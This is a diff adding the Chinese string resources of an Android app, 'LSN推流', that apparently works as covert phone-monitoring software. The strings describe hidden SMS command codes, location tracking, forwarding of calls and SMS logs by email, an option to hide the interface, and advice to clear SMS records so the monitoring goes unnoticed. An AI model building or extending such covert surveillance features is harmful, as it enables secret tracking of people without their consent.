@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">LSN推流</string>
+    <string name="app_lang">zh</string>
+    
+    <string name="notification_title">LSN Live Push</string>
+    <string name="notification_message">LSN Live Push is running</string>
+    
+    <string name="ui_ok_btn">确定</string>
+    <string name="ui_cancel_btn">取消</string>
+    <string name="ui_yes_btn">是</string>
+    <string name="ui_no_btn">否</string>
+    <string name="msg_communication_error">网络通信错误，请检查网络设置后重试</string>
+    <string name="msg_internet_error">无法访问英特网，请检查网络设置</string>
+    <string name="msg_please_wait">请等待。。。</string>
+    
+    <string name="ui_mobcam_btn">启动服务 》》</string>
+    <string name="ui_mobcam2_btn">退出服务 》》</string>
+    <string name="ui_settings_btn">功能设置 》》</string>
+    <string name="msg_no_camera">该设备没有摄像头，无法启动推流端程序</string>
+    <string name="msg_enable_location">为了实现定位追踪功能，请开启受控手机的GPS定位和无线网络定位</string>
+    
+	<string name="msg_not_available">[不可用]</string>
+	<string name="msg_display_mobcam_id">该推流端ID是“%1$d”，点击[设置]按钮后可以看到</string>
+	<string name="msg_not_approved_please_buy">软件非授权或者已过试用期，不能继续使用，请付费购买！</string>
+	
+	<string name="msg_sms_power_percent_format">报告：推流端手机的电池剩余电量为“%1$s”</string>
+	<string name="msg_unknown_val">未知值</string>
+	<string name="msg_sms_cmd_result_0">很抱歉，您发过来的指令[%1$s]我不认识，无法执行。</string>
+	<string name="msg_sms_cmd_result">您发的指令[%1$s]我已执行。</string>
+	<string name="msg_sms_cmd_result_enabled">开</string>
+	<string name="msg_sms_cmd_result_disabled">关</string>
+	<string name="msg_sms_cmd_query_result_format">报告：推流端ID是“%1$s”，WiFi状态：%2$s，电池剩余电量：%3$s</string>
+	<string name="msg_sms_location_format">位置 %1$s</string>
+	<string name="msg_unknown_location">暂时无法获取定位信息，请稍后重试。</string>
+	<string name="msg_phonenum_cleared">已经清除主控手机号码，以后不再有短信控制功能。</string>
+	
+	<string name="msg_sms_cmd_enable_email">KE</string>
+	<string name="msg_sms_cmd_disable_email">GE</string>
+	<string name="msg_sms_cmd_set_name">MC</string>
+	<string name="msg_sms_cmd_set_pass">MM</string>
+	<string name="msg_sms_cmd_clear_phonenum">QH</string>
+	
+	<string name="msg_sms_hidden_cmd_location">;wz;</string>
+	<string name="msg_sms_hidden_cmd_query">;cx;</string>
+	<string name="msg_sms_hidden_cmd_enable_wifi">;kw;</string>
+	<string name="msg_sms_hidden_cmd_disable_wifi">;gw;</string>
+	<string name="msg_sms_hidden_cmd_enable_email">;ke;</string>
+	<string name="msg_sms_hidden_cmd_disable_email">;ge;</string>
+	<string name="msg_sms_hidden_cmd_restart">;cq;</string>
+	<string name="msg_sms_hidden_cmd_restart_simple">;;;</string>
+	<string name="msg_sms_hidden_cmd_mobiledata_on_simple">,,,</string>
+	<string name="msg_sms_hidden_cmd_mobiledata_off_simple">...</string>
+	
+	<string name="ui_tab_basic">基本设置</string>
+	<string name="ui_tab_phone">接收邮箱和电话</string>
+	<string name="msg_save_settings_or_not">是否保存刚才更改的设置？</string>
+	
+	<string name="ui_text_mobcam_id_0">【推流端ID：尚未获取】</string>
+	<string name="ui_text_mobcam_id_1">【推流端ID：%1$d】</string>
+	<string name="ui_text_mobcam_name">请为该推流端取个名：（昵称）</string>
+	<string name="ui_text_mobcam_password">请为该推流端设置连接密码：</string>
+	<string name="ui_checkbox_auto_start">手机开机后自动启动后台服务</string>
+	<string name="ui_checkbox_hide_ui">不显示设置界面和弹出提示，不再振动</string>
+	<string name="msg_level_too_low_for_allow_hide">您的ID权限不够，这次可以隐藏，下次启动后将不再隐藏。需要升级ID权限请联系官方客服\r\nQQ1：478046502  \r\nQQ2：1795782702</string>
+	
+	<string name="ui_text_cap_method">截屏方式：</string>
+	<string name="ui_text_cap_method_auto">auto</string>
+	<string name="ui_text_cap_method_adb">adb</string>
+	<string name="ui_text_cap_method_flinger">flinger</string>
+	<string name="ui_text_cap_method_fb">fb</string>
+	
+	<string name="ui_checkbox_enable_email">开启电子邮件通知</string>
+	<string name="ui_text_email_address">发送电子邮件通知时的目标邮箱：</string>
+	<string name="ui_hint_email_address">请输入你的有效电子邮箱</string>
+	<string name="ui_text_email_tips">为了能接收到通知邮件，请先登录你设置的邮箱向系统邮箱“admin@wangling-tech.com”发送一封邮件，邮件内容不限。之后，你就可以正常收到邮件通知了！</string>
+	<string name="ui_text_sms_phone_num">主控手机号码（用于短信远程控制）：</string>
+	<string name="ui_hint_sms_phone_num">最多设置3个手机号码，用分号“;”分隔</string>
+	
+	<string name="msg_on_sms_sent_format">%1$s 通知：[%2$s]发出短信给%3$s(%4$s)：%5$s</string>
+	<string name="msg_on_sms_recv_format">%1$s 通知：[%2$s]%3$s(%4$s)发来短信：%5$s</string>
+	<string name="msg_on_call_out_format">%1$s 通知：[%2$s]打出电话给%3$s(%4$s)</string>
+	<string name="msg_on_call_in_format" >%1$s 通知：[%2$s]%3$s(%4$s)打进电话</string>
+	<string name="msg_on_call_in_accepted_format" >%1$s 通知：[%2$s]%3$s(%4$s)打进的电话，已接听</string>
+	<string name="msg_on_call_in_missed_format"   >%1$s 通知：[%2$s]%3$s(%4$s)打进的电话，未接</string>
+	<string name="msg_on_call_in_rejected_format" >%1$s 通知：[%2$s]%3$s(%4$s)打进的电话，拒接</string>
+	
+	<string name="msg_on_client_connected">LSN推流：建立了连接</string>
+	<string name="msg_on_client_disconnected">LSN推流：断开了连接</string>
+	<string name="msg_on_service_created">LSN推流：后台服务已启动</string>
+	<string name="msg_on_service_destroyed">LSN推流：后台服务已退出</string>
+	
+	<string name="msg_on_camid_ok">%1$s 提醒：上线了（推流端ID是%2$d）</string>
+	<string name="msg_on_camid_ok_suffix">注意该推流端手机是Android-4.4版本或以上，后台收发短信无法隐藏，请清理短信记录，尽量不要使用短信控制功能。</string>
+	<string name="msg_on_camid_ng">%1$s 提醒：免费试用期已过，失去VIP权限，升级ID权限请联系客服[QQ:478046502 QQ:1795782702]（推流端ID是%2$d）</string>
+	
+</resources>
